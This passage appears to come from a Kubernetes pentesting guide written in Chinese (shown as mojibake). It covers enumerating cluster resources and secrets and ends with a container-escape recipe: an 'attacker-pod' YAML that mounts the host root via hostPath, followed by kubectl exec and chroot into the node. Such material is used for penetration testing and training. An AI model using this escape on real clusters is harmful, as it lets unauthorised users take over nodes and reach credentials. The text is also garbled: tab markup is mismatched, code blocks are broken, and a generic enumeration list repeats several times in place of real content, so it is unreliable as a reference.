æ­£å¦‚åœ¨æœ¬é¡µå¼€å¤´è®¨è®ºçš„é‚£æ ·ï¼Œ**å½“ä¸€ä¸ª Pod è¿è¡Œæ—¶ï¼Œé€šå¸¸ä¼šåˆ†é…ä¸€ä¸ªæœåŠ¡è´¦æˆ·ç»™å®ƒ**ã€‚å› æ­¤ï¼Œåˆ—å‡ºæœåŠ¡è´¦æˆ·ã€å®ƒä»¬çš„æƒé™ä»¥åŠå®ƒä»¬æ‰€åœ¨çš„ä½ç½®å¯èƒ½å…è®¸ç”¨æˆ·æå‡æƒé™ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}åœ¨è¿›è¡ŒKubernetesæšä¸¾æ—¶ï¼ŒAPIæ˜¯ä¸€ä¸ªé‡è¦çš„ç›®æ ‡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨kubectlå‘½ä»¤è¡Œå·¥å…·ä¸Kubernetes APIè¿›è¡Œäº¤äº’ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æœ‰ç”¨çš„kubectlå‘½ä»¤ï¼š

- åˆ—å‡ºæ‰€æœ‰å‘½åç©ºé—´ï¼š`kubectl get namespaces`
- åˆ—å‡ºæ‰€æœ‰Podsï¼š`kubectl get pods --all-namespaces`
- åˆ—å‡ºæ‰€æœ‰æœåŠ¡ï¼š`kubectl get services --all-namespaces`
- åˆ—å‡ºæ‰€æœ‰éƒ¨ç½²ï¼š`kubectl get deployments --all-namespaces`

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨`kubectl proxy`å‘½ä»¤åœ¨æœ¬åœ°å¯åŠ¨ä»£ç†æœåŠ¡å™¨ï¼Œä»¥ä¾¿ç›´æ¥è®¿é—®Kubernetes APIã€‚{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### è·å–éƒ¨ç½²

éƒ¨ç½²æŒ‡å®šéœ€è¦è¿è¡Œçš„**ç»„ä»¶**ã€‚
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API æšä¸¾

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

### 1. **è®¿é—® Kubernetes API æœåŠ¡å™¨**

æ‚¨å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤è¡Œå·¥å…·æˆ–ç›´æ¥é€šè¿‡ HTTP è®¿é—® Kubernetes API æœåŠ¡å™¨ã€‚ç¡®ä¿æ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚

### 2. **ä½¿ç”¨ `kubectl` å‘½ä»¤**

ä½¿ç”¨ `kubectl` å‘½ä»¤å¯ä»¥åˆ—å‡ºé›†ç¾¤ä¸­çš„æ‰€æœ‰èµ„æºï¼Œä¾‹å¦‚ `kubectl get all`ã€‚

### 3. **è®¿é—® API ç«¯ç‚¹**

å°è¯•è®¿é—®ä»¥ä¸‹å¸¸è§çš„ API ç«¯ç‚¹ï¼š

- `/api`
- `/apis`
- `/healthz`
- `/version`

### 4. **æŸ¥æ‰¾æœªç»æˆæƒçš„ç«¯ç‚¹**

æœ‰æ—¶ä¼šå‘ç°æœªç»æˆæƒè®¿é—®çš„ API ç«¯ç‚¹ï¼Œå¯èƒ½ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯æˆ–å¯¼è‡´å®‰å…¨é£é™©ã€‚

### 5. **ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·**

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·å¦‚ `kube-hunter` æˆ– `kubetap` æ¥å¸®åŠ©æšä¸¾ Kubernetes APIã€‚

### 6. **æ£€æŸ¥ RBAC é…ç½®**

æŸ¥çœ‹è§’è‰²åŸºäºè®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰é…ç½®ï¼Œä»¥äº†è§£å“ªäº›æƒé™åˆ†é…ç»™äº†ä¸åŒçš„ç”¨æˆ·æˆ–æœåŠ¡è´¦æˆ·ã€‚

### 7. **å®¡æŸ¥ Service Account**

å®¡æŸ¥é›†ç¾¤ä¸­çš„æœåŠ¡è´¦æˆ·ï¼Œç¡®ä¿å®ƒä»¬è¢«æ­£ç¡®é…ç½®å¹¶ä¸”æ²¡æœ‰è¿‡å¤šçš„æƒé™ã€‚

### 8. **ç›‘æ§ API æ´»åŠ¨**

ç›‘æ§ Kubernetes API çš„æ´»åŠ¨ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚

### 9. **æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯**

åœ¨ API å“åº”ä¸­æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å‡­è¯ã€é…ç½®æ–‡ä»¶ç­‰ã€‚

### 10. **å®¡æŸ¥ç½‘ç»œç­–ç•¥**

å®¡æŸ¥ç½‘ç»œç­–ç•¥ä»¥ç¡®ä¿é€‚å½“é™åˆ¶äº†å¯¹ Kubernetes API çš„è®¿é—®ã€‚

</div>
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### è·å– Pods

Pods æ˜¯å®é™…å°†è¿è¡Œçš„å®¹å™¨ã€‚
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API æšä¸¾

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

### 1. **è®¿é—® Kubernetes API æœåŠ¡å™¨**

æ‚¨å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤è¡Œå·¥å…·æˆ–ç›´æ¥é€šè¿‡ HTTP è®¿é—® Kubernetes API æœåŠ¡å™¨ã€‚ç¡®ä¿æ‚¨å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚

### 2. **ä½¿ç”¨ `kubectl` åˆ—å‡ºèµ„æº**

ä½¿ç”¨ `kubectl` å‘½ä»¤å¯ä»¥åˆ—å‡ºé›†ç¾¤ä¸­çš„å„ç§èµ„æºï¼Œä¾‹å¦‚ Podsã€Servicesã€Deployments ç­‰ã€‚è¿™å¯ä»¥å¸®åŠ©æ‚¨äº†è§£é›†ç¾¤ä¸­æ­£åœ¨è¿è¡Œçš„å·¥ä½œè´Ÿè½½ã€‚

### 3. **æŸ¥æ‰¾æœªç»æˆæƒçš„æœåŠ¡å¸æˆ·**

æ£€æŸ¥é›†ç¾¤ä¸­æ˜¯å¦å­˜åœ¨æœªç»æˆæƒçš„æœåŠ¡å¸æˆ·ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é£é™©ã€‚

### 4. **æ‰«æ API æœåŠ¡å™¨**

ä½¿ç”¨å·¥å…·å¦‚ `kube-hunter` å¯ä»¥æ‰«æ Kubernetes é›†ç¾¤ï¼Œå‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´å’Œé£é™©ã€‚

### 5. **æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯**

æ£€æŸ¥ API å“åº”ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç ã€å¯†é’¥æˆ–å…¶ä»–å‡­æ®ã€‚

### 6. **å®¡æŸ¥ RBAC é…ç½®**

å®¡æŸ¥ Role-Based Access Controlï¼ˆRBACï¼‰é…ç½®ï¼Œç¡®ä¿åªæœ‰æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç‰¹å®šèµ„æºã€‚

### 7. **ç›‘æ§ API è°ƒç”¨**

è®¾ç½®ç›‘æ§æœºåˆ¶ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å¼‚å¸¸çš„ API è°ƒç”¨ï¼Œå¯èƒ½æ˜¯æ¶æ„è¡Œä¸ºçš„è¿¹è±¡ã€‚

### 8. **å®¡æŸ¥å®¡è®¡æ—¥å¿—**

å®¡æŸ¥å®¡è®¡æ—¥å¿—ï¼Œä»¥ä¾¿è·Ÿè¸ªå¯¹ Kubernetes API çš„è®¿é—®å’Œæ“ä½œã€‚

é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæ‚¨å¯ä»¥æ›´å…¨é¢åœ°äº†è§£ Kubernetes é›†ç¾¤çš„å®‰å…¨çŠ¶å†µï¼Œå¹¶åŠæ—¶é‡‡å–å¿…è¦çš„æªæ–½æ¥åŠ å¼ºå®‰å…¨æ€§ã€‚

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### è·å–æœåŠ¡

Kubernetes **æœåŠ¡** ç”¨äº**åœ¨ç‰¹å®šç«¯å£å’ŒIPä¸Šå…¬å¼€æœåŠ¡**ï¼ˆè¯¥ç«¯å£å’ŒIPå°†å……å½“å®é™…æä¾›æœåŠ¡çš„ pod çš„è´Ÿè½½å‡è¡¡å™¨ï¼‰ã€‚äº†è§£åœ¨å“ªé‡Œå¯ä»¥æ‰¾åˆ°å…¶ä»–æœåŠ¡ä»¥å°è¯•æ”»å‡»æ˜¯å¾ˆæœ‰è¶£çš„ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## æšä¸¾ Kubernetes API

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

1. **è®¿é—® API æœåŠ¡å™¨**ï¼šå°è¯•è®¿é—® Kubernetes API æœåŠ¡å™¨ï¼ˆé€šå¸¸åœ¨ `https://<cluster-ip>:<port>`ï¼‰ã€‚å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤è¡Œå·¥å…·æˆ–è€…ç›´æ¥å‘é€ HTTP è¯·æ±‚ã€‚

2. **æ¢æµ‹ API è·¯å¾„**ï¼šå°è¯•å‘ç°æš´éœ“éœ²çš„ API è·¯å¾„ï¼Œä¾‹å¦‚ `/api`ã€`/apis`ã€`/version` ç­‰ã€‚

3. **åˆ—ä¸¾èµ„æº**ï¼šä½¿ç”¨ API è°ƒç”¨æ¥åˆ—ä¸¨ä¸¾é›†ç¾¤ä¸­çš„èµ„æºï¼Œä¾‹å¦‚ `kubectl get all` å‘½ä»¤ã€‚

4. **æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯**ï¼šæœç´¢æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ Podã€Secretsã€ConfigMaps ç­‰ã€‚

5. **æ‰«ææœªæˆæƒè®¿é—®**ï¼šæ‰«æ é›†ç¾¤ä¸­æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®çš„æ¼æ´ï¼Œä¾‹å¦‚åŒ¿åç”¨æˆ·å¯ä»¥è®¿é—®çš„èµ„æºã€‚

6. **å®¡æŸ¥ RBAC é…ç½®**ï¼šæ£€æŸ¥ Role-Based Access Controlï¼ˆRBACï¼‰é…ç½®ï¼ŒæŸ¥çœ‹å“ªäº›æƒé™è¢ªè¢«æˆäºˆç»™äº†ä¸åŒçš„ç”¨æˆ·æˆ–æœåŠ¡è´¦æˆ·ã€‚

7. **æ£€æŸ¥ Web æ§åˆ¶å°**ï¼šå¦‚æœå¯ç”¨äº† Kubernetes Web æ§åˆ¶å°ï¼Œç¡®ä¿å·²ç»è¿›è¡Œäº†é€‚å½“çš„å®‰å…¨é…ç½®ã€‚

8. **ä½¿ç”¨å·¥å…·**ï¼šä½¿ç”¨ä¸“é—¨çš„å·¥å…·å¦‚ `kube-hunter` æ¥è‡ªåŠ¨åŒ–æšä¸¾ Kubernetes é›†ç¾¤ä¸­çš„å®‰å…¨é—®é¢˜ã€‚

æšä¸¾ Kubernetes API å¯ä»¥å¸®åŠ©å‘ç°æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œä¸ºåç»­çš„æ¸—é€æµ‹è¯•æä¾›é‡è¦ä¿¡æ¯ã€‚

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### è·å–èŠ‚ç‚¹

è·å–é›†ç¾¤ä¸­é…ç½®çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API æšä¸¾

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

### 1. **è®¿é—® Kubernetes API æœåŠ¡å™¨**

æ‚¨å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤è¡Œå·¥å…·æˆ–ç›´æ¥é€šè¿‡ HTTP è®¿é—® Kubernetes API æœåŠ¡å™¨ã€‚ç¡®ä¿æ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚

### 2. **ä½¿ç”¨ `kubectl` åˆ—å‡ºèµ„æº**

ä½¿ç”¨ `kubectl` å‘½ä»¤å¯ä»¥åˆ—å‡ºé›†ç¾¤ä¸­çš„å„ç§èµ„æºï¼Œä¾‹å¦‚ podsã€deploymentsã€services ç­‰ã€‚è¿™å¯ä»¥å¸®åŠ©æ‚¨äº†è§£é›†ç¾¤ä¸­æ­£åœ¨è¿è¡Œçš„å·¥ä½œè´Ÿè½½ã€‚

### 3. **æŸ¥æ‰¾æœªç»æˆæƒçš„æœåŠ¡å¸æˆ·**

æ£€æŸ¥é›†ç¾¤ä¸­æ˜¯å¦å­˜åœ¨æœªç»æˆæƒçš„æœåŠ¡å¸æˆ·ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é£é™©ã€‚

### 4. **æ‰«æ API æœåŠ¡å™¨**

ä½¿ç”¨å·¥å…·å¦‚ kube-hunter æˆ– kubei è¿›è¡Œä¸»åŠ¨æ‰«æï¼Œä»¥å‘ç°æ½œåœ¨çš„å®‰å…¨é—®é¢˜ã€‚

### 5. **æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯**

æ£€æŸ¥ API å¯¹è±¡ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç ã€å¯†é’¥ç­‰ã€‚

### 6. **å®¡æŸ¥ RBAC é…ç½®**

å®¡æŸ¥è§’è‰²åŸºäºè®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰é…ç½®ï¼Œç¡®ä¿åªæœ‰æˆæƒç”¨æˆ·å¯ä»¥è®¿é—®ç‰¹å®šèµ„æºã€‚

### 7. **ç›‘æ§ API æ´»åŠ¨**

ç›‘æ§ Kubernetes API çš„æ´»åŠ¨ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚

### 8. **å®¡æŸ¥å®¡è®¡æ—¥å¿—**

å®¡æŸ¥å®¡è®¡æ—¥å¿—ï¼Œä»¥è·Ÿè¸ªå¯¹ Kubernetes API çš„è®¿é—®å’Œæ“ä½œã€‚

é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæ‚¨å¯ä»¥æ›´å¥½åœ°äº†è§£ Kubernetes é›†ç¾¤çš„å®‰å…¨æ€§ï¼Œå¹¶å‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### è·å– DaemonSets

**DaemonSets** å…è®¸ç¡®ä¿é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ˆæˆ–æ‰€é€‰èŠ‚ç‚¹ï¼‰ä¸Šéƒ½è¿è¡Œç€ä¸€ä¸ª**ç‰¹å®šçš„ pod**ã€‚å¦‚æœåˆ é™¤ DaemonSetï¼Œåˆ™ç”±å…¶ç®¡ç†çš„ pod ä¹Ÿå°†è¢«ç§»é™¤ã€‚
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}åœ¨Kubernetesä¸­ï¼ŒAPIæœåŠ¡å™¨æ˜¯é›†ç¾¤ä¸­çš„å…³é”®ç»„ä»¶ä¹‹ä¸€ã€‚é€šè¿‡æšä¸¾Kubernetes APIï¼Œé»‘å®¢å¯ä»¥å‘ç°æœ‰å…³é›†ç¾¤é…ç½®ã€éƒ¨ç½²å’ŒæœåŠ¡çš„é‡è¦ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç”¨äºæšä¸¾Kubernetes APIçš„å¸¸è§æŠ€æœ¯ï¼š

- **è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰æšä¸¾**ï¼šå°è¯•è®¿é—®`/api`å’Œ`/apis`ç«¯ç‚¹ä»¥è·å–APIç»„çš„åˆ—è¡¨ã€‚
- **èµ„æºæšä¸¾**ï¼šä½¿ç”¨`/apis/{api-group}/{version}/`ç«¯ç‚¹æ¥åˆ—å‡ºç‰¹å®šAPIç»„ä¸­çš„èµ„æºã€‚
- **ç‰ˆæœ¬æšä¸¾**ï¼šå°è¯•è®¿é—®`/api/{version}`ç«¯ç‚¹ä»¥è·å–æ”¯æŒçš„APIç‰ˆæœ¬ã€‚
- **å‘½åç©ºé—´æšä¸¾**ï¼šä½¿ç”¨`/api/{version}/namespaces/`ç«¯ç‚¹æ¥åˆ—å‡ºé›†ç¾¤ä¸­çš„å‘½åç©ºé—´ã€‚

è¿™äº›æŠ€æœ¯å¯ä»¥å¸®åŠ©é»‘å®¢äº†è§£Kubernetesé›†ç¾¤çš„ç»“æ„å’Œé…ç½®ï¼Œä¸ºè¿›ä¸€æ­¥çš„æ”»å‡»æä¾›æœ‰ç”¨çš„ä¿¡æ¯ã€‚{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### è·å– cronjob

Cron ä½œä¸šå…è®¸ä½¿ç”¨ç±»ä¼¼ crontab çš„è¯­æ³•å®‰æ’å¯åŠ¨ä¸€ä¸ªå°†æ‰§è¡ŒæŸäº›æ“ä½œçš„ podã€‚
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes Enumeration

### Service Accounts

Service accounts can be used to interact with the Kubernetes API. Enumerate service accounts to find any with excessive permissions.

#### List service accounts

```bash
kubectl get serviceaccounts --all-namespaces
```

#### Describe service account

```bash
kubectl describe serviceaccount <service_account_name> -n <namespace>
```

#### List service account tokens

```bash
kubectl get secrets --all-namespaces | grep <service_account_name>
``json
```
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### è·å– configMap

configMap ä¸­å§‹ç»ˆåŒ…å«å¤§é‡ä¿¡æ¯å’Œé…ç½®æ–‡ä»¶ï¼Œä¸ºåœ¨ Kubernetes ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºæä¾›æ”¯æŒã€‚é€šå¸¸ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è®¸å¤šç”¨äºè¿æ¥å’ŒéªŒè¯å…¶ä»–å†…éƒ¨/å¤–éƒ¨æœåŠ¡çš„å¯†ç ã€ç§˜é’¥å’Œä»¤ç‰Œã€‚
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API æšä¸¾

åœ¨è¿›è¡Œ Kubernetes æ¸—é€æµ‹è¯•æ—¶ï¼Œæšä¸¾ Kubernetes API æ˜¯éå¸¸é‡è¦çš„ä¸€æ­¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š

### 1. **è®¿é—® Kubernetes API æœåŠ¡å™¨**

æ‚¨å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤è¡Œå·¥å…·æˆ–ç›´æ¥é€šè¿‡ HTTP è®¿é—® Kubernetes API æœåŠ¡å™¨ã€‚ç¡®ä¿æ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œè¿™äº›æ“ä½œã€‚

### 2. **ä½¿ç”¨ `kubectl` åˆ—å‡ºèµ„æº**

ä½¿ç”¨ `kubectl` å‘½ä»¤å¯ä»¥åˆ—å‡ºé›†ç¾¤ä¸­çš„å„ç§èµ„æºï¼Œä¾‹å¦‚ Podsã€Servicesã€Deployments ç­‰ã€‚è¿™å¯ä»¥å¸®åŠ©æ‚¨äº†è§£é›†ç¾¤ä¸­æ­£åœ¨è¿è¡Œçš„å·¥ä½œè´Ÿè½½ã€‚

### 3. **æŸ¥æ‰¾æœªç»æˆæƒçš„æœåŠ¡è´¦æˆ·**

æ£€æŸ¥é›†ç¾¤ä¸­æ˜¯å¦å­˜åœ¨æœªç»æˆæƒçš„æœåŠ¡è´¦æˆ·ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é£é™©ã€‚

### 4. **æ‰«æ API æœåŠ¡å™¨**

ä½¿ç”¨å·¥å…·å¦‚ `kube-hunter` å¯ä»¥æ‰«æ Kubernetes é›†ç¾¤çš„ API æœåŠ¡å™¨ï¼Œå‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚

### 5. **æ£€æŸ¥ RBAC é…ç½®**

å®¡æŸ¥é›†ç¾¤ä¸­çš„ Role-Based Access Controlï¼ˆRBACï¼‰é…ç½®ï¼Œç¡®ä¿åªæœ‰æˆæƒçš„å®ä½“å¯ä»¥è®¿é—®ç‰¹å®šèµ„æºã€‚

### 6. **æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯**

æœç´¢ Pod æè¿°æ–‡ä»¶ã€ç¯å¢ƒå˜é‡å’Œå…¶ä»–èµ„æºï¼ŒæŸ¥æ‰¾å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯çš„åœ°æ–¹ã€‚

### 7. **ç›‘æ§ API è°ƒç”¨**

è®¾ç½®ç›‘æ§æœºåˆ¶ï¼Œè·Ÿè¸ªå’Œè®°å½•å¯¹ Kubernetes API çš„æ‰€æœ‰è°ƒç”¨ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚

é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæ‚¨å¯ä»¥æ›´å¥½åœ°äº†è§£ Kubernetes é›†ç¾¤çš„å®‰å…¨çŠ¶å†µï¼Œå¹¶åŠæ—¶é‡‡å–å¿…è¦çš„æªæ–½æ¥åŠ å¼ºå®‰å…¨æ€§ã€‚

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### è·å– "all"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **è·å–Podçš„èµ„æºæ¶ˆè€—**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### ä»å®¹å™¨ä¸­é€ƒè„±

å¦‚æœæ‚¨èƒ½å¤Ÿåˆ›å»ºæ–°çš„å®¹å™¨ï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½èƒ½å¤Ÿä»ä¸­é€ƒè„±åˆ°èŠ‚ç‚¹ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä¸€ä¸ªyamlæ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œåˆ‡æ¢åˆ°åˆ›å»ºçš„å®¹å™¨ï¼Œç„¶åchrootåˆ°èŠ‚ç‚¹çš„ç³»ç»Ÿä¸­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å·²ç»å­˜åœ¨çš„å®¹å™¨ä½œä¸ºyamlæ–‡ä»¶çš„å‚è€ƒï¼Œå› ä¸ºå®ƒä»¬æ˜¾ç¤ºäº†ç°æœ‰çš„é•œåƒå’Œè·¯å¾„ã€‚
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> å¦‚æœæ‚¨éœ€è¦åœ¨ç‰¹å®šèŠ‚ç‚¹ä¸Šåˆ›å»º podï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–èŠ‚ç‚¹ä¸Šçš„æ ‡ç­¾
>
> `k get nodes --show-labels`
>
> é€šå¸¸ï¼Œkubernetes.io/hostname å’Œ node-role.kubernetes.io/master éƒ½æ˜¯ç”¨äºé€‰æ‹©çš„å¥½æ ‡ç­¾ã€‚
>
> [å‚è€ƒé“¾æ¥]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

ç„¶ååˆ›å»ºæ‚¨çš„ attack.yaml æ–‡ä»¶
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[åŸå§‹yamlæº](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ä¹‹åï¼Œæ‚¨åˆ›å»ºpod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
ç°åœ¨æ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤åˆ‡æ¢åˆ°åˆ›å»ºçš„ podï¼š
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
æœ€åï¼Œæ‚¨å°†chrootè¿›å…¥èŠ‚ç‚¹çš„ç³»ç»Ÿ
```bash
chroot /root /bin/bash
```
ä¿¡æ¯æ¥æºï¼š[Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## å‚è€ƒèµ„æ–™

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
